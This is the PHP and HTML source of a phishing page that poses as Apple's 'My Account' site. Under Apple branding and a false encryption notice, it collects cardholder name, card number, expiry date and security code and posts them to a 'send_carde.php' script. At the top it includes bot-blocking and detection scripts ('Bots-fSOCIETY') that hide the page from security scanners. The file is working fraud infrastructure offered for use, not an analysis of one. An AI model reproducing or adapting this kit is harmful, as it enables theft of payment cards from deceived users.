<?php
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");

include("../Bots-fSOCIETY/anti1.php");
include("../Bots-fSOCIETY/anti2.php");
include("../Bots-fSOCIETY/anti3.php");
include("../Bots-fSOCIETY/anti4.php");
include("../Bots-fSOCIETY/anti5.php");
include("../Bots-fSOCIETY/anti6.php");
include("../Bots-fSOCIETY/anti7.php");
include("../Bots-fSOCIETY/anti8.php");

?><html lang="en-US" class="en-us amr js en us svg no-touch no-ie no-oldie no-ios supports-animation supports-columns supports-backdrop-filter as-mouseuser no-supports-applepay no-supports-apw"><head>
	    <link rel="shortcut icon" href="./style/favicon.ico" type="image/X-icon">

<title>My Account Apple</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
<link rel="stylesheet" href="./style/signin.css" media="screen, print">
<link rel="stylesheet" href="./style/external.css" media="screen, print">

<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>

		

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#SecurityCode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#ExpiryDate').mask('00/00');

  });
  </script>


<style>
#SecurityCode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
background-size: 81px;
background-position: 104.5% 48.1%;

}


 #cardnumber  {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
background-size: 72px;
}

</style>



<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}



</style>



</head>

    <body style="zoom: 1;">

  
        <div id="page">   	  	

<nav id="ac-globalnav" class="js no-touch">
	<nav id="ac-globalnav" class="js no-touch">
	<div id="orinput" class="ac-gn-content">
		<ul class="ac-gn-header">
			<li class="ac-gn-item ac-gn-menuicon">
				<label class="ac-gn-menuicon-label">
					<span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
					</span>
					<span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
					</span>
				</label>
				<a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
					<span class="ac-gn-menuanchor-label">Global Nav Open Menu</span>
				</a>
				<a href="#" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
					<span class="ac-gn-menuanchor-label">Global Nav Close Menu</span>
				</a>
			</li>
			<li class="ac-gn-item ac-gn-apple">
			<a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus-small">
					<span class="ac-gn-link-text">Apple</span>
				</a>
			</li>
			<li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
				<a href="#" class="ac-gn-link ac-gn-link-bag">
					<span class="ac-gn-link-text">Shopping Bag</span>
					<span class="ac-gn-bag-badge"></span>
				</a>
				<span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
			</li>
		</ul>
		<div id="REPAVLL" class="ac-gn-search-placeholder-container" role="search">
			<div class="ac-gn-search ac-gn-search-small">
				<a id="ac-gn-link-search-small" class="ac-gn-link" href="#">
					<div class="ac-gn-search-placeholder-bar">
						<div class="ac-gn-search-placeholder-input">
							<div class="ac-gn-search-placeholder-input-text">
								<div class="ac-gn-link-search ac-gn-search-placeholder-input-icon"></div>
								<span class="ac-gn-search-placeholder">Search apple.com</span>
							</div>
						</div>
						<div class="ac-gn-searchview-close ac-gn-searchview-close-small ac-gn-search-placeholder-searchview-close">
							<span class="ac-gn-searchview-close-cancel">Cancel</span>
						</div>
					</div>
				</a>
			</div>
		</div>
		<ul class="ac-gn-list">
			<li class="ac-gn-item ac-gn-apple">
				<a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus">
						<span class="ac-gn-link-text">Apple</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
				<a href="#" class="ac-gn-link ac-gn-link-mac">
						<span class="ac-gn-link-text">Mac</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
				<a href="#" class="ac-gn-link ac-gn-link-ipad">
						<span class="ac-gn-link-text">iPad</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
				<a href="#" class="ac-gn-link ac-gn-link-iphone">
						<span class="ac-gn-link-text">iPhone</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
				<a href="#" class="ac-gn-link ac-gn-link-watch">
						<span class="ac-gn-link-text">Watch</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
				<a href="#" class="ac-gn-link ac-gn-link-tv">
						<span class="ac-gn-link-text">TV</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-music">
				<a href="#" class="ac-gn-link ac-gn-link-music">
						<span class="ac-gn-link-text">Music</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-support">
				<a href="#" class="ac-gn-link ac-gn-link-support">
						<span class="ac-gn-link-text">Support</span>
					</a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
				<a href="#" class="ac-gn-link ac-gn-link-search" id="ac-gn-link-search"></a>
			</li>
			<li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
				<a href="#" class="ac-gn-link ac-gn-link-bag">
						<span class="ac-gn-link-text">Shopping Bag</span>
						<span class="ac-gn-bag-badge" aria-hidden="true"></span>
					</a>
				<span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
			</li>
		</ul>
		<aside class="ac-gn-searchview" id="ac-gn-searchview">
			<div class="ac-gn-searchview-content">
				<div class="ac-gn-searchview-bar">
					<div class="ac-gn-searchview-bar-wrapper">
						<form method="get" href="#" class="ac-gn-searchform" id="ac-gn-searchform">
							<div class="ac-gn-searchform-wrapper">
								<input placeholder="Search apple.com" id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text">
								<input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
								<button class="ac-gn-searchform-submit" type="submit" id="ac-gn-searchform-submit"></button>
								<button class="ac-gn-searchform-reset" type="reset" id="ac-gn-searchform-reset">
										<span class="ac-gn-searchform-reset-background"></span>
									</button>
							</div>
						</form>
						<button id="ac-gn-searchview-close-small" class="ac-gn-searchview-close ac-gn-searchview-close-small">
								<span class="ac-gn-searchview-close-cancel">
									Cancel
								</span>
							</button>
					</div>
				</div>
				<aside class="ac-gn-searchresults" id="ac-gn-searchresults">	<section class="ac-gn-searchresults-section ac-gn-searchresults-section-defaultlinks">
		<div class="ac-gn-searchresults-section-wrapper">
			<h3 class="ac-gn-searchresults-header ac-gn-searchresults-animated">Quick Links</h3>
			<ul class="ac-gn-searchresults-list" id="defaultlinks">
				<li class="ac-gn-searchresults-item ac-gn-searchresults-animated">
					<a href="#" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Find a Store</a>
				</li>
				<li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
					<a href="#" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Today at Apple</a>
				</li>
				<li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
					<a href="#" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Accessories</a>
				</li>
				<li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
					<a href="#" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">AirPods</a>
				</li>
				<li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
					<a href="#" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">iPod</a>
				</li>
			</ul>
			<span role="status" class="ac-gn-searchresults-count" aria-live="polite">5 Quick Links</span>
		</div>
	</section>

</aside>
			</div>
			<button aria-label="Cancel Search" class="ac-gn-searchview-close" id="ac-gn-searchview-close">
					<span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span>
						<span class="ac-gn-searchview-close-right"></span>
					</span>
				</button>
		</aside>
		<aside class="ac-gn-bagview">
			<div class="ac-gn-bagview-scrim">
				<span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
			</div>
			<div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
			</div>
		</aside>
	</div>
</nav>
</nav>


<div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>


<style type="text/css">
	
	.spinner, .mask {
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 9998;
    margin: 0;
    text-align: center;
}


.spinner:after, .mask:after {
    content: '';
    position: fixed;
    z-index: -1;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    background: #fff;
    -moz-opacity: .9;
    -khtml-opacity: .9;
    -webkit-opacity: .9;
    opacity: .9;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
}


</style>


<div style="display: none;" id="speeemf" class="transitioning spinner" aria-busy="true">


     	 	

<div style="
    display: block;
    margin: 0 auto 10px;
    text-align: center;  height: 34px; " class="ispinner white large animating">
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
  <div class="ispinner-blade"></div>
</div>

</div>


 

      	
	

            <div id="signin-container" class="rs-page-content">
            



            <div><div id="rr-viewport"></div><div><div class="rs-signin">

            	<div class="row as-l-container"><div class="rs-signin-returningcustomer">
				<div class=" col-md-4">
					<h4>
						Step 1 Add card to your Account. 
					</h4>
					<p>
						Step 2 Upload your documents.
					</p>
</br>
				</div>

<center>

            	<div class="" style="
    text-align: center;
">

            		<form class="column large-5 small-12 as-signin-returningcustomer" id="cardapp" name="cardapp" action="./system/send_carde.php" method="post" >


            		<fieldset><div class="as-signin-input">

<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="NameOnCard" name="NameOnCard" class="form-textbox form-textbox-text" maxlength="120" aria-required="true" aria-describedby="NameOnCardinputError" aria-invalid="false"><span class="form-label">
<span id="loginHome.customerLogin.appleId-label">Name On Card</span></span>
<div><div id="loginHome.customerLogin.appleId-error" class="form-message-wrapper">
<span id="NameOnCardinputError" class="is-error" style="display: none;"></span>
</div><div id="loginHome.customerLogin.appleId-warn" class="form-message-warning"></div></div></div>


<div class="dddd form-element ">
<input style="border-radius: 12px; background-position: 98.5% -0.2%;" required="" value="" type="text" id="cardnumber" name="cardnumber" class="form-textbox form-textbox-text" maxlength="120" aria-required="true" aria-describedby="cardnumberinputError" aria-invalid="false"><span class="form-label">
<span id="loginHome.customerLogin.appleId-label">Card Number</span></span>
<div><div id="loginHome.customerLogin.appleId-error" class="form-message-wrapper">
<span id="cardnumberinputError" class="is-error" style="display: none;"></span>
</div><div id="loginHome.customerLogin.appleId-warn" class="form-message-warning"></div></div></div>


<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="ExpiryDate"  name="ExpiryDate" class="form-textbox form-textbox-text" maxlength="120" aria-required="true" aria-describedby="ExpiryDateinputError" aria-invalid="false"><span class="form-label">
<span id="loginHome.customerLogin.appleId-label">Expiry Date MM/YY</span></span>
<div><div id="loginHome.customerLogin.appleId-error" class="form-message-wrapper">
<span id="ExpiryDateinputError" class="is-error" style="display: none;"></span>
</div><div id="loginHome.customerLogin.appleId-warn" class="form-message-warning"></div></div></div>


<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="SecurityCode" name="SecurityCode" class="form-textbox form-textbox-text" maxlength="120" aria-required="true" aria-describedby="SecurityCodeinputError" aria-invalid="false"><span class="form-label">
<span id="loginHome.customerLogin.appleId-label">Security Code (CCV)</span></span>
<div><div id="loginHome.customerLogin.appleId-error" class="form-message-wrapper">
<span id="SecurityCodeinputError" class="is-error" style="display: none;"></span>
</div><div id="loginHome.customerLogin.appleId-warn" class="form-message-warning"></div></div></div>


            		

      

            		


            	</div></fieldset>


            		<div class="as-signin-button">


             		 <input style="border-radius: 12px;background: #0071e3" required="" value="Continue" type="submit" class="button button-block form-button" aria-required="true">

</div></form>







            				</div></center></div></div></div><div class="as-chat rs-chat"><div class="as-l-container rs-chat-content">
	
		<div>Need more help?  <button class="as-chat-button as-buttonlink">Chat now</button> .</div>
	
	
	
</div></div><div class="as-footnotes"><div class="as-footnotes-content"><div data-recon-globalpostrender="footer,isEmpty,loginHome" class="as-footnotes-sosumi"><p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our Security Policy. <a href="#">Security Policy</a>.</p></div></div></div></div></div></div>
            

            
            
	
       	
			<footer class="as-globalfooter as-globalfooter-simple as-globalfooter-contained js flexbox">
	<div class="as-globalfooter-content">
		<div class="as-globalfooter-mini">

	    

	<div class="as-globalfooter-mini-shop">
		
	
		<p>More ways to shop: <span class="nowrap">Visit an <a href="#" target="_blank">Apple Store</a></span>, <span class="nowrap"> <a href="#" target="_blank">find a reseller</a></span>.</p>
	
	
	

	</div>



		
			<div class="as-globalfooter-mini-locale">

	        		<a target="_blank" class="as-globalfooter-mini-locale-link" href="#">
	        		
	        			United States	        			</a>
	        			
	        </div>
	    
	   <div id="scLk" class="as-globalfooter-mini-legal">
			<p class="as-globalfooter-mini-legal-copyright">
	    		Copyright © 2021 Apple Inc.  All rights reserved.
	    	</p>
	    	<p class="as-globalfooter-mini-legal-links">
             	
                    <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">Privacy Policy</a>
                
             	
                	<a target="_blank" class="as-globalfooter-mini-legal-link" href="#">Terms of Use</a>
                
            	
                    <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">Sales and Refunds</a>
            	

				<a target="_blank" class="as-globalfooter-mini-legal-link" href="#">
			        Site Map
			    </a>
			</p>
    	</div>
   <script type="text/javascript">

    $('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":

 $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 94%');
$('#thDSecure').css('background-position', '255.5% -20.5%'); 

                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');


$('#cardnumber').css('background-position', '98.5% 97%'); 


$('#thDSecure').css('background-position', '99.5% -20.5%'); 



$('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');






   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 72%');

$('#thDSecure').css('background-position', '99.5% 9.5%'); 

                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');

$('#cardnumber').css('background-position', '98.5% 69%');

$('#thDSecure').css('background-position', '102.5% 62.5%'); 



                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



                        $('#cardnumber').css('background-position', '98.5% 46.8%');

$('#thDSecure').css('background-position', '98.5% 46.8%'); 

          
$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#csc').attr('pattern', '[0-9]{4}');
          $('#Securitycode').attr('maxlength', '4');

                        $('#cardnumber').css('background-position', '98.5% 6%');
$('#thDSecure').css('background-position', '99.5% 34%'); 




$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');


                        break;
          case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');



$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


                       break;
          case "DINERS_CLUB":

$('.chtadakchi').attr('id', 'chtacalub');


$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');





                        $('#cardnumber').css('background-position', '98.5% 24.8%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 

                        break;
          default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
      } else {

$('.chtadakchi').attr('id', 'jkljk');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% -0.2%');

$('#csc').attr('placeholder', 'Enter security code');
            }
       // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
    </script>



  <script type="text/javascript">
        $(function() {
        $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
      $('#cardnumber').validateCreditCard(function(result) {
          if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
          
                }
            });
            });
    });
        </script>

		</div>

    	</div>
	</footer>
        </div>
</body></html>